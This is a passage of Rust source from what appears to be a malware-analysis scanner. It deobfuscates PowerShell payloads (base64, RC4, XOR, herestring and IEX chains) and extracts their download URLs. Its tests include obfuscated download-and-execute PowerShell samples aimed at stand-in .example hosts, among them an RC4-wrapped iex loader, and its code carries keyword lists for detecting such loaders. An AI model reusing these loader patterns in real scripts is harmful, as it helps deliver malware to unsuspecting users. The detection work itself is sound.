        search_from = start.saturating_add(b64_len.max(1));
    }
    out
}

fn looks_like_powershell_payload(bytes: &[u8]) -> bool {
    let text = decode_payload(bytes);
    contains_ascii_case_insensitive(&text, "invoke-")
        || contains_ascii_case_insensitive(&text, "new-object")
        || contains_ascii_case_insensitive(&text, "downloadstring")
        || contains_ascii_case_insensitive(&text, "downloadfile")
        || contains_ascii_case_insensitive(&text, "start-process")
        || contains_ascii_case_insensitive(&text, "powershell")
        || contains_ascii_case_insensitive(&text, "frombase64string")
        || contains_ascii_case_insensitive(&text, "iex ")
        || contains_ascii_case_insensitive(&text, "http://")
        || contains_ascii_case_insensitive(&text, "https://")
}

fn is_utf16le(bytes: &[u8]) -> bool {
    if bytes.len() < 4 {
        return false;
    }
    // Check BOM first
    if bytes[0] == 0xFF && bytes[1] == 0xFE {
        return true;
    }
    // Heuristic: odd-offset bytes are mostly zero (ASCII codepoints in UTF-16LE)
    let sample = &bytes[..bytes.len().min(256)];
    let pairs = sample.len() / 2;
    if pairs == 0 {
        return false;
    }
    let odd_zeros = sample.chunks_exact(2).filter(|b| b[1] == 0).count();
    odd_zeros * 2 >= pairs // >= 50% of odd bytes are zero
}

fn dynamic_download_invoke_urls(text: &str) -> Vec<String> {
    let expanded_text;
    let text = if text.contains('+') && contains_ascii_case_insensitive(text, ".invoke") {
        expanded_text = expand_double_string_concat(&expand_string_concat(text));
        expanded_text.as_str()
    } else {
        text
    };

    let mut foreach_urls: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();
    let mut array_bindings: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();
    let mut string_bindings: std::collections::HashMap<String, String> =
        std::collections::HashMap::new();

    for caps in PS_ANY_STRING_ASSIGN_RE.captures_iter(text) {
        let Some(var) = caps.get(1) else {
            continue;
        };
        let Some(value) = caps.get(2).or_else(|| caps.get(3)) else {
            continue;
        };
        string_bindings.insert(
            var.as_str().to_ascii_lowercase(),
            value.as_str().to_string(),
        );
    }

    for caps in PS_ARRAY_LITERAL_ASSIGN_RE.captures_iter(text) {
        let Some(var) = caps.get(1) else {
            continue;
        };
        let Some(body) = caps.get(2) else {
            continue;
        };
        let urls = ps_literal_urls(body.as_str());
        if !urls.is_empty() {
            array_bindings.insert(var.as_str().to_ascii_lowercase(), urls);
        }
    }

    for caps in FOREACH_LITERAL_ARRAY_RE.captures_iter(text) {
        let Some(var) = caps.get(1) else {
            continue;
        };
        let Some(body) = caps.get(2) else {
            continue;
        };
        let urls = ps_literal_urls(body.as_str());
        if !urls.is_empty() {
            foreach_urls.insert(var.as_str().to_ascii_lowercase(), urls);
        }
    }

    for caps in FOREACH_ARRAY_VAR_RE.captures_iter(text) {
        let (Some(item_var), Some(array_var)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let Some(urls) = array_bindings.get(&array_var.as_str().to_ascii_lowercase()) else {
            continue;
        };
        foreach_urls.insert(item_var.as_str().to_ascii_lowercase(), urls.clone());
    }

    let mut seen = std::collections::HashSet::new();
    let mut urls = Vec::new();
    let scan_texts: Vec<&str> = std::iter::once(text)
        .chain(string_bindings.values().map(String::as_str))
        .collect();
    for scan_text in &scan_texts {
        for caps in DYNAMIC_DOWNLOAD_INVOKE_RE.captures_iter(scan_text) {
            if let Some(literal) = caps.get(2) {
                let Some(url) = crate::deob_scan::normalize_liberal_url_token(literal.as_str())
                else {
                    continue;
                };
                if seen.insert(url.clone()) {
                    urls.push(url);
                }
                continue;
            }

            let Some(var) = caps.get(1) else {
                continue;
            };
            if let Some(values) = foreach_urls.get(&var.as_str().to_ascii_lowercase()) {
                for url in values {
                    if seen.insert(url.clone()) {
                        urls.push(url.clone());
                    }
                }
            }
        }
    }

    for scan_text in &scan_texts {
        for caps in DYNAMIC_VAR_METHOD_INVOKE_RE.captures_iter(scan_text) {
            let Some(method_var) = caps.get(1) else {
                continue;
            };
            let Some(method) = string_bindings.get(&method_var.as_str().to_ascii_lowercase())
            else {
                continue;
            };
            if !is_dynamic_download_method(method) {
                continue;
            }

            if let Some(literal) = caps.get(3) {
                let Some(url) = crate::deob_scan::normalize_liberal_url_token(literal.as_str())
                else {
                    continue;
                };
                if seen.insert(url.clone()) {
                    urls.push(url);
                }
                continue;
            }

            let Some(var) = caps.get(2) else {
                continue;
            };
            let var_name = var.as_str().to_ascii_lowercase();
            if let Some(url) = string_bindings
                .get(&var_name)
                .and_then(|value| crate::deob_scan::normalize_liberal_url_token(value))
            {
                if seen.insert(url.clone()) {
                    urls.push(url);
                }
                continue;
            }
            if let Some(values) = foreach_urls.get(&var_name) {
                for url in values {
                    if seen.insert(url.clone()) {
                        urls.push(url.clone());
                    }
                }
            }
        }
    }
    urls
}

fn is_dynamic_download_method(method: &str) -> bool {
    matches!(
        method.to_ascii_lowercase().as_str(),
        "downloadstring"
            | "downloadstringasync"
            | "downloadstringtaskasync"
            | "downloadfile"
            | "downloaddata"
            | "openreadasync"
            | "down"
    )
}

#[cfg(test)]
mod dynamic_download_invoke_tests {
    use super::dynamic_download_invoke_urls;

    #[test]
    fn dynamic_downloadstringasync_invoke_url_extracted() {
        let urls = dynamic_download_invoke_urls(
            r#"$b=New-Object Net.WebClient;$b.('DownloadStringAsync').Invoke('https://dyn-async.example/a.ps1')"#,
        );

        assert_eq!(urls, vec!["https://dyn-async.example/a.ps1"]);
    }

    #[test]
    fn dynamic_downloadstringtaskasync_invoke_url_extracted() {
        let urls = dynamic_download_invoke_urls(
            r#"$b=New-Object Net.WebClient;$b.('DownloadStringTaskAsync').Invoke('https://dyn-taskasync.example/a.ps1')"#,
        );

        assert_eq!(urls, vec!["https://dyn-taskasync.example/a.ps1"]);
    }

    #[test]
    fn dynamic_openreadasync_invoke_url_extracted() {
        let urls = dynamic_download_invoke_urls(
            r#"$b=New-Object Net.WebClient;$b.('OpenReadAsync').Invoke('https://dyn-openread.example/a.bin')"#,
        );

        assert_eq!(urls, vec!["https://dyn-openread.example/a.bin"]);
    }

    #[test]
    fn dynamic_concatenated_method_invoke_url_extracted() {
        let urls = dynamic_download_invoke_urls(
            r#"$b=New-Object Net.WebClient;$b.('Download'+'String').Invoke('https://dyn-concat-method.example/a.ps1')"#,
        );

        assert_eq!(urls, vec!["https://dyn-concat-method.example/a.ps1"]);
    }

    #[test]
    fn dynamic_variable_method_and_url_invoke_extracted() {
        let urls = dynamic_download_invoke_urls(
            r#"$spyd='DownloadFile';$stjern='https://dyn-var-method.example/payload.exe';$b=New-Object Net.WebClient;$b.$spyd.Invoke($stjern,$sten)"#,
        );

        assert_eq!(urls, vec!["https://dyn-var-method.example/payload.exe"]);
    }

    #[test]
    fn dynamic_variable_method_in_assigned_invocation_body_extracted() {
        let urls = dynamic_download_invoke_urls(
            r#"$spyd='DownloadFile';$stjern='https://dyn-assigned-body.example/payload.exe';$oprrsa='$siouxerf.$spyd.Invoke($stjern,$sten)';Skuri $oprrsa"#,
        );

        assert_eq!(urls, vec!["https://dyn-assigned-body.example/payload.exe"]);
    }
}

fn ps_literal_urls(text: &str) -> Vec<String> {
    PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|literal_caps| {
            literal_caps
                .get(1)
                .or_else(|| literal_caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .filter(|value| looks_like_liberal_url(value))
        .filter_map(|value| crate::deob_scan::normalize_liberal_url_token(&value))
        .collect()
}

fn ps_literal_urls_in_download_context(text: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive(text, "download")
        && !contains_ascii_case_insensitive(text, "invoke-webrequest")
        && !contains_ascii_case_insensitive(text, "invoke-restmethod")
    {
        return Vec::new();
    }
    let mut seen = std::collections::HashSet::new();
    PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|literal_caps| {
            literal_caps
                .get(1)
                .or_else(|| literal_caps.get(2))
                .map(|m| (m.start(), m.as_str().to_string()))
        })
        .filter(|(start, value)| {
            looks_like_liberal_url(value)
                && !ps_url_inside_non_download_hash_option(text, *start)
                && !ps_url_is_non_download_option_value(text, *start)
                && seen.insert(value.clone())
        })
        .filter_map(|(_, value)| crate::deob_scan::normalize_liberal_url_token(&value))
        .collect()
}

/// Run all URL-extraction patterns over each ps1 payload. Emit a Download
/// trait for each unique (url, payload_idx) pair found.
// Matches `[Convert]::FromBase64String('...')` or `[System.Convert]::FromBase64String('...')`
// at the top level of a PS payload. Captures: 1=base64 string.
#[allow(clippy::expect_used)]
static OUTER_FROMBASE64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*'([A-Za-z0-9+/=]{32,})'\s*\)"#,
    )
    .expect("outer frombase64 literal")
});

#[cfg(test)]
mod herestring_iex_tests {
    use super::*;
    #[test]
    fn extracts_clean_herestring_replace_iex() {
        let text = "$myvar=@'\nthis is INNERSTRIP body\n'@\n$other=$myvar -replace 'INNERSTRIP',''\niex $other\n";
        let bodies = extract_herestring_replace_iex_from_text(text);
        assert_eq!(bodies.len(), 1, "got {:?}", bodies);
        assert_eq!(bodies[0], "this is  body");
    }
    #[test]
    fn extracts_doubled_quote_herestring() {
        // Same chain wrapped in outer single-quote literal: internal quotes
        // doubled, IEX written as `&('Invoke-Expression')$var`.
        let text = "$myvar=@''\nthis is INNERSTRIP body\n''@\n$other=$myvar -replace ''INNERSTRIP'',''''\n&('Invoke-Expression')$other\n";
        let bodies = extract_herestring_replace_iex_from_text(text);
        assert_eq!(bodies.len(), 1, "got {:?}", bodies);
        assert_eq!(bodies[0], "this is  body");
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod rc4_tests {
    use super::{decode_rc4_wrapper_from_text, rc4_crypt};
    use base64::Engine;

    fn rc4_encrypt(plain: &[u8], key: &[u8]) -> Vec<u8> {
        let mut s = [0u8; 256];
        for (i, slot) in s.iter_mut().enumerate() {
            *slot = i as u8;
        }
        let mut j = 0u8;
        for i in 0..256usize {
            j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
            s.swap(i, j as usize);
        }
        let mut i = 0u8;
        let mut j = 0u8;
        let mut out = Vec::with_capacity(plain.len());
        for &b in plain {
            i = i.wrapping_add(1);
            j = j.wrapping_add(s[i as usize]);
            s.swap(i as usize, j as usize);
            let k = s[(s[i as usize].wrapping_add(s[j as usize])) as usize];
            out.push(b ^ k);
        }
        out
    }

    #[test]
    fn rc4_known_vector_decrypts_plaintext() {
        let cipher = match base64::engine::general_purpose::STANDARD.decode("u/MW6NlArwrT") {
            Ok(bytes) => bytes,
            Err(err) => panic!("base64: {err}"),
        };
        let plain = rc4_crypt(&cipher, b"Key");
        assert_eq!(String::from_utf8_lossy(&plain), "Plaintext");
    }

    #[test]
    fn rc4_wrapper_shape_is_decoded() {
        let plaintext = "Invoke-WebRequest https://rc4.example/stage.ps1";
        let key = b"Key";
        let enc_b64 = base64::engine::general_purpose::STANDARD
            .encode(rc4_encrypt(plaintext.as_bytes(), key));
        let wrapper = r#"
$rc4EncData = '{enc_b64}'
$rc4KeyB64 = 'S2V5'
$rc4Decrypt = { param([byte[]]$cipherData,[byte[]]$decryptKey) $cipherData -bxor $decryptKey }
iex ([Text.Encoding]::UTF8.GetString(((& $rc4Decrypt ([Convert]::FromBase64String($rc4EncData)) ([Convert]::FromBase64String($rc4KeyB64)))))
"#;
        let Some(decoded) = decode_rc4_wrapper_from_text(&wrapper.replace("{enc_b64}", &enc_b64))
        else {
            panic!("rc4 wrapper");
        };
        assert_eq!(
            String::from_utf8_lossy(&decoded),
            "Invoke-WebRequest https://rc4.example/stage.ps1"
        );
    }
}

#[cfg(test)]
mod passthrough_prefilter_tests {
    use super::contains_potential_passthrough_call_wrapper;

    #[test]
    fn detects_quoted_passthrough_wrapper_shape() {
        let text = "function x { &('Invoke-Expression') ($y) }";
        assert!(contains_potential_passthrough_call_wrapper(text));
    }

    #[test]
    fn ignores_ampersand_calls_without_quoted_target() {
        let text = "function x { &($target) ($y) }";
        assert!(!contains_potential_passthrough_call_wrapper(text));
    }

    #[test]
    fn trailing_ampersand_sequence_does_not_panic() {
        let text = "invoke-expression &>&&>&>&&>&&&";
        assert!(!contains_potential_passthrough_call_wrapper(text));
    }
}

/// Walk every entry in `env.all_extracted_ps1` looking for a one-shot
/// herestring + `-replace` + IEX chain (sometimes wrapped in one round of
/// `[Convert]::FromBase64String('...')`). When found, push the decoded inner
/// PS body to `env.all_extracted_ps1` so the main scan picks it up.
fn extract_herestring_replace_iex_inners(env: &mut Environment) {
    let payloads = env.all_extracted_ps1.clone();
    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
    let mut seen: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    for payload in payloads {
        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
            continue;
        }
        let text = String::from_utf8_lossy(&payload).into_owned();
        // Candidate texts: the raw payload, plus one round of base64 decoding
        // for `[Convert]::FromBase64String('...')` wrappers.
        let mut candidates: Vec<String> = vec![text.clone()];
        for caps in OUTER_FROMBASE64_LITERAL_RE.captures_iter(&text) {
            let Some(b64) = caps.get(1) else { continue };
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64.as_str()) else {
                continue;
            };
            if decoded.len() > 4 * 1024 * 1024 {
                continue;
            }
            let s = decode_payload(&decoded).into_owned();
            candidates.push(s);
        }
        for cand in candidates {
            let bodies = extract_herestring_replace_iex_from_text(&cand);
            for body in bodies {
                let bytes = body.into_bytes();
                if seen.insert(bytes.clone()) {
                    new_payloads.push(bytes);
                }
            }
        }
    }
    for payload in new_payloads {
        env.push_extracted_ps1(payload);
    }
}

fn extract_inline_frombase64_ps1_inners(env: &mut Environment) {
    let payloads = env.all_extracted_ps1.clone();
    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
    let mut seen: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    for payload in payloads {
        if env.check_timeout() {
            return;
        }
        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
            continue;
        }
        let text = decode_payload(&payload);
        for caps in OUTER_FROMBASE64_LITERAL_RE.captures_iter(&text) {
            let Some(b64) = caps.get(1) else { continue };
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64.as_str()) else {
                continue;
            };
            if decoded.len() > 4 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
                continue;
            }
            if seen.insert(decoded.clone()) {
                new_payloads.push(decoded);
            }
        }
    }
    for payload in new_payloads {
        env.push_extracted_ps1(payload);
    }
}

fn extract_getstring_frombase64_var_inners(env: &mut Environment) {
    let payloads = env.all_extracted_ps1.clone();
    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
    let mut seen: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();

    for payload in payloads {
        if env.check_timeout() {
            return;
        }
        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
            continue;
        }
        let text = decode_payload(&payload);
        if !contains_ascii_case_insensitive(&text, "getstring")
            || !contains_ascii_case_insensitive(&text, "frombase64string")
        {
            continue;
        }
        let bindings = ps_string_bindings(&text);
        if bindings.is_empty() {
            continue;
        }
        for caps in GETSTRING_B64_VAR_RE.captures_iter(&text).take(64) {
            let Some(encoding) = caps.get(1) else {
                continue;
            };
            let Some(var) = caps.get(2) else { continue };
            let Some(b64) = bindings.get(&var.as_str().to_ascii_lowercase()) else {
                continue;
            };
            let Some(decoded) = decode_ps_base64_string(b64) else {
                continue;
            };
            if decoded.len() > 4 * 1024 * 1024 {
                continue;
            }
            let bytes = match encoding.as_str().to_ascii_lowercase().as_str() {
                "unicode" => match decode_utf16_lossy(&decoded, false) {
                    Some(value) => value.into_bytes(),
                    None => continue,
                },
                "bigendianunicode" => match decode_utf16_lossy(&decoded, true) {
                    Some(value) => value.into_bytes(),
                    None => continue,
                },
                _ => decoded,
            };
            if !looks_like_powershell_payload(&bytes) || !seen.insert(bytes.clone()) {
                continue;
            }
            new_payloads.push(bytes);
        }
    }

    for payload in new_payloads {
        env.push_extracted_ps1(payload);
    }
}

/// Walk every entry in `env.all_extracted_ps1` looking for a PowerShell RC4
/// loader that carries one base64 ciphertext variable and one base64 key
/// variable. When found, decrypt the payload and push the decoded inner script
/// so the main scan can recurse into it.
fn extract_rc4_wrapper_inners(env: &mut Environment) {
    let payloads = env.all_extracted_ps1.clone();
    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
    let mut seen: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();

    for payload in payloads {
        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
            continue;
        }
        let text = decode_payload(&payload).into_owned();
        let mut candidates: Vec<String> = vec![text.clone()];
        for caps in OUTER_FROMBASE64_LITERAL_RE.captures_iter(&text) {
            let Some(b64) = caps.get(1) else { continue };
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64.as_str()) else {
                continue;
            };
            if decoded.len() > 4 * 1024 * 1024 {
                continue;
            }
            candidates.push(decode_payload(&decoded).into_owned());
        }

        for cand in candidates {
            let Some(decoded) = decode_rc4_wrapper_from_text(&cand) else {
                continue;
            };
            if seen.insert(decoded.clone()) {
                new_payloads.push(decoded);
            }
        }
    }

    for payload in new_payloads {
        env.push_extracted_ps1(payload);
    }
}

fn extract_inline_xor_base64_function_inners(env: &mut Environment) {
    let payloads = env.all_extracted_ps1.clone();
    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
    let mut seen: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();

    for payload in payloads {
        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
            continue;
        }
        let text = decode_payload(&payload).into_owned();
        for decoded in decode_inline_xor_base64_functions(&text) {
            if seen.insert(decoded.clone()) {
                new_payloads.push(decoded);
            }
        }
    }

    for payload in new_payloads {
        env.push_extracted_ps1(payload);
    }
}

fn decode_rc4_wrapper_from_text(text: &str) -> Option<Vec<u8>> {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("frombase64string")
        || !lower.contains("-bxor")
        || !(lower.contains("iex")
            || lower.contains("invoke-expression")
            || lower.contains("finalscript"))
    {
        return None;
    }

    let bindings = ps_string_bindings(text);
    if bindings.len() < 2 {
        return None;
    }

    let mut key_b64: Option<&str> = None;
    let mut data_b64: Option<&str> = None;
    for (name, value) in &bindings {
        let lower_name = name.to_ascii_lowercase();
        if lower_name.contains("key")
            && key_b64
                .map(|current| value.len() > current.len())
                .unwrap_or(true)
        {
            key_b64 = Some(value.as_str());
        }
        if (lower_name.contains("enc")
            || lower_name.contains("data")
            || lower_name.contains("cipher"))
            && data_b64
                .map(|current| value.len() > current.len())
                .unwrap_or(true)
        {
            data_b64 = Some(value.as_str());
        }
    }

    let data_b64 = data_b64?;
    let key_b64 = key_b64?;
    let cipher = base64::engine::general_purpose::STANDARD
        .decode(data_b64)
        .ok()?;
    let key = base64::engine::general_purpose::STANDARD
        .decode(key_b64)
        .ok()?;
    if cipher.is_empty() || key.is_empty() {
        return None;
    }
    let decoded = rc4_crypt(&cipher, &key);
    let decoded_text = decode_payload(&decoded).into_owned();
    let decoded_lower = decoded_text.to_ascii_lowercase();
    if !(decoded_lower.contains("http://")
        || decoded_lower.contains("https://")
        || decoded_lower.contains("invoke-")
        || decoded_lower.contains("assembly::load")
        || decoded_lower.contains("frombase64string")
        || decoded_lower.contains("new-object"))
    {
        return None;
    }
    Some(decoded_text.into_bytes())
}

fn rc4_crypt(cipher: &[u8], key: &[u8]) -> Vec<u8> {
    if key.is_empty() {
        return Vec::new();
    }
    let mut s = [0u8; 256];
    for (i, slot) in s.iter_mut().enumerate() {
        *slot = i as u8;
    }

    let mut j = 0u8;
    for i in 0..256usize {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }

    let mut out = Vec::with_capacity(cipher.len());
    let mut i = 0u8;
    let mut j = 0u8;
    for &byte in cipher {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        let t = s[i as usize].wrapping_add(s[j as usize]);
        out.push(byte ^ s[t as usize]);
    }
    out
}

/// Find every `$VAR = @'...'@ ; $VAR2 = $VAR -replace 'X','Y' ; iex $VAR2`
/// chain in `text` and return the decoded inner bodies.
fn extract_herestring_replace_iex_from_text(text: &str) -> Vec<String> {
    use std::collections::HashMap;
    let mut here: HashMap<String, String> = HashMap::new();
    for caps in PS_HERESTRING_ASSIGN_RE.captures_iter(text) {
        let Some(name) = caps.get(1) else { continue };
        let Some(body) = caps.get(2) else { continue };
        here.insert(
            name.as_str().to_ascii_lowercase(),
            body.as_str().to_string(),
        );
    }
    if here.is_empty() {
        return Vec::new();
    }
    let mut out = Vec::new();
    for caps in PS_VAR_REPLACE_ASSIGN_RE.captures_iter(text) {
        let dest = match caps.get(1) {
            Some(m) => m.as_str().to_ascii_lowercase(),
            None => continue,
        };
        let src = match caps.get(2) {
            Some(m) => m.as_str().to_ascii_lowercase(),
            None => continue,
        };
        let Some(src_body) = here.get(&src) else {
            continue;
        };
        let needle = match caps.get(3) {
            Some(m) => m.as_str().replace("''", "'"),
            None => continue,
        };
        let repl = match caps.get(4) {
            Some(m) => m.as_str().replace("''", "'"),
            None => continue,
        };
        let src_body = src_body.replace("''", "'");
        let iex_pat = format!(
            r#"(?i)(?:iex\b|invoke-expression\b|&\s*\(\s*'invoke[-' ]*expression'\s*\)|&\s*\(\s*'invoke'\s*\+\s*'-expression'\s*\))\s*\$(?-i:{dest})\b"#,
            dest = regex::escape(&dest)
        );
        let Ok(iex_re) = regex::Regex::new(&iex_pat) else {
            continue;
        };
        if !iex_re.is_match(text) {
            continue;
        }
        let decoded = if needle.is_empty() {
            src_body
        } else {
            src_body.replace(needle.as_str(), repl.as_str())
        };
        if decoded.trim().is_empty() {
            continue;
        }
        out.push(decoded);
    }
    out
}

#[allow(clippy::expect_used)]
static PS_INVOKE_EXPRESSION_SINGLE_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)^\s*(?:iex|invoke-expression)\s*\(?\s*'((?:[^']|'')*)'\s*\)?\s*;?\s*$"#)
        .expect("ps invoke-expression single literal regex")
});

#[allow(clippy::expect_used)]
static PS_REVERSED_URL_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)([A-Za-z0-9._~:/?!$&*+=;,%\-]{8,400}//:(?:ptth|sptth))"#)
        .expect("ps reversed url token regex")
});

fn extract_invoke_expression_literal_inners(env: &mut Environment) {
    let payloads = env.all_extracted_ps1.clone();
    for payload in payloads {
        if env.check_timeout() {
            return;
        }
        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
            continue;
        }
        let raw_text = decode_payload(&payload);
        let Some(caps) = PS_INVOKE_EXPRESSION_SINGLE_LITERAL_RE.captures(raw_text.trim()) else {
            continue;
        };
        let Some(inner) = caps.get(1).map(|m| m.as_str().replace("''", "'")) else {
            continue;
        };
        if inner.trim().len() < 16 {
            continue;
        }
        env.push_extracted_ps1(inner.into_bytes());
    }
}

pub fn scan_ps1_payloads(env: &mut Environment) {
    if env.check_timeout() {
        return;
    }
    // Pre-pass: extract herestring + -replace + IEX inner payloads from raw
    // PS bytes, decoding one round of outer `[Convert]::FromBase64String(...)`
    // first. Adds decoded inners to `all_extracted_ps1` so the main scan loop
    // sees them. Run on raw bytes (before strip_marker_noise) so the marker-
    // noise stripper doesn't eat the `-replace` target chars from inside the
    // herestring body.
    extract_herestring_replace_iex_inners(env);
    extract_inline_frombase64_ps1_inners(env);
    extract_getstring_frombase64_var_inners(env);
    extract_invoke_expression_literal_inners(env);
    extract_rc4_wrapper_inners(env);
    extract_inline_xor_base64_function_inners(env);
    let mut expansion_cache: std::collections::HashMap<(bool, String), String> =
        std::collections::HashMap::new();
    let file_backed_payloads = env.all_extracted_ps1.clone();
    for payload in file_backed_payloads {
        if env.check_timeout() {
            return;
        }
        let raw_text = decode_payload(&payload);
        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
            continue;
        }
        let raw_env_expanded = expand_ps_env_refs(&raw_text, env);
        let text_expanded =
            expand_ps1_scan_text_cached(&raw_env_expanded, env, &mut expansion_cache, false);
        if env.check_timeout() {
            return;
        }
        scan_file_backed_base64_ps1(&text_expanded, env, &text_expanded);
    }

    // Use all_extracted_ps1 to cover every payload across the run, not just
    // the latest exec_ps1 (which gets drained).
    let payloads: Vec<Vec<u8>> = env.all_extracted_ps1.clone();
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();
    let known_launch_urls: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for (idx, payload) in payloads.iter().enumerate() {
        if env.check_timeout() {
            return;
        }
        let raw_text = decode_payload(payload);
        let raw_owned: String = raw_text.clone().into_owned();
        if payload.len() >= LARGE_PS1_FAST_PATH_BYTES {
            scan_large_ps1_payload_fast(&raw_owned, env);
            continue;
        }
        let raw_env_expanded = expand_ps_env_refs(&raw_owned, env);

        let text_expanded =
            expand_ps1_scan_text_cached(&raw_env_expanded, env, &mut expansion_cache, true);
        if env.check_timeout() {
            return;
        }
        // Dual-scan: also run URL regexes over alias-expanded version so that
        // `iwr`, `irm`, `wget` etc. are caught even if obfuscation expansion
        // didn't surface them.
        let text_aliased = crate::ps_alias::expand_aliases_if_ps(&text_expanded);
        let candidates: Vec<String> = if text_aliased != text_expanded {
            vec![text_expanded, text_aliased]
        } else {
            vec![text_expanded]
        };

        // Use the first candidate for OutFile and fallback command context.
        let primary = &candidates[0];

        let regexes: &[&Lazy<Regex>] = &[
            &PS_CMDLET_QUOTED_DQ_URL_RE,
            &PS_CMDLET_QUOTED_SQ_URL_RE,
            &IWR_RE,
            &IRM_RE,
            &PS_SCHEMELESS_IP_CMDLET_RE,
            &PS_SCHEMELESS_DOMAIN_CMDLET_RE,
            &CURL_EXE_RE,
            &MSHTA_URL_RE,
            &DOWNLOADSTRING_RE,
            &BARE_DOWNLOADSTRING_RE,
            &DOWNLOADSTRING_FRAGMENT_RE,
            &CALLBYNAME_DOWNLOADSTRING_RE,
            &START_BITS_RE,
            &START_BITS_SCHEMELESS_SOURCE_RE,
            &NET_REQ_RE,
            &PS_GENERIC_URL_RE,
        ];

        for text in &candidates {
            for re in regexes {
                for caps in re.captures_iter(text) {
                    let Some(url_match) = caps.get(1) else {
                        continue;
                    };
                    if ps_url_inside_non_download_hash_option(text, url_match.start()) {
                        continue;
                    }
                    if ps_url_is_non_download_option_value(text, url_match.start()) {
                        continue;
                    }
                    if ps_url_inside_path_getfilename(text, url_match.start()) {
                        continue;
                    }
                    if ps_url_is_secondary_downloadfile_argument_url(text, url_match.start()) {
                        continue;
                    }
                    let mut url = clean_ps_url(url_match.as_str());
                    if is_schemeless_ip_url(&url) {
                        url = format!("http://{url}");
                    }
                    let Some(url) = crate::deob_scan::normalize_liberal_url_token(&url)
                        .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(&url))
                    else {
                        continue;
                    };
                    if known_launch_urls.contains(&url) {
                        continue;
                    }
                    if !seen.insert((idx, url.clone())) {
                        continue;
                    }
                    let statement = caps
                        .get(0)
                        .map(|m| logical_statement_at(text, m.start()))
                        .unwrap_or(primary);
                    if let Some(name) = ps_url_assignment_name(statement, url_match.as_str()) {
                        if !ps_text_uses_variable_as_download_source(text, &name) {
                            env.traits.push(Trait::UrlVariable {
                                name,
                                url,
                                cmd: ps_download_cmd_context(idx, statement, url_match.as_str()),
                            });
                            continue;
                        }
                    }
                    let dst_hint = outfile_hint_from(statement);
                    env.traits.push(Trait::Download {
                        cmd: ps_download_cmd_context(idx, statement, &url),
                        src: url,
                        dst: dst_hint,
                    });
                }
            }

            for url in dynamic_download_invoke_urls(text) {
                if known_launch_urls.contains(&url) {
                    continue;
                }
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                env.traits.push(Trait::Download {
                    cmd: ps_download_cmd_context(idx, primary, &url),
                    src: url,
                    dst: outfile_hint_from(primary),
                });
            }

            for url in ps_reversed_urls(text) {
                if known_launch_urls.contains(&url) {
                    continue;
                }
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                env.traits.push(Trait::DownloadInDeobText {
                    src: url,
                    line_hint: "reversed-url".to_string(),
                });
            }

            for url in ps_literal_urls_in_download_context(text) {
                if contains_ascii_case_insensitive(text, "getfilename")
                    && !contains_ascii_case_insensitive(text, "invoke-webrequest")
                    && !contains_ascii_case_insensitive(text, "invoke-restmethod")
                    && !contains_ascii_case_insensitive(text, "downloadfile")
                    && !contains_ascii_case_insensitive(text, "downloadstring")
                {
                    continue;
                }
                if known_launch_urls.contains(&url) {
                    continue;
                }
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                env.traits.push(Trait::Download {
                    cmd: ps_download_cmd_context(idx, primary, &url),
                    src: url,
                    dst: outfile_hint_from(primary),
                });
            }
        }
    }
}

fn expand_ps1_scan_text_cached(
    raw_env_expanded: &str,
    env: &mut Environment,
    expansion_cache: &mut std::collections::HashMap<(bool, String), String>,
    full_dense_skip_nth: bool,
) -> String {
    let dense_skip = looks_like_dense_skip_nth_payload(raw_env_expanded);
    let cache_mode = dense_skip && full_dense_skip_nth;
    let key = (cache_mode, raw_env_expanded.to_string());
    if let Some(expanded) = expansion_cache.get(&key) {
        return expanded.clone();
    }

    let expanded = if dense_skip {
        if full_dense_skip_nth {
            expand_dense_skip_nth_payload(raw_env_expanded)
        } else {
            expand_skip_nth(raw_env_expanded)
        }
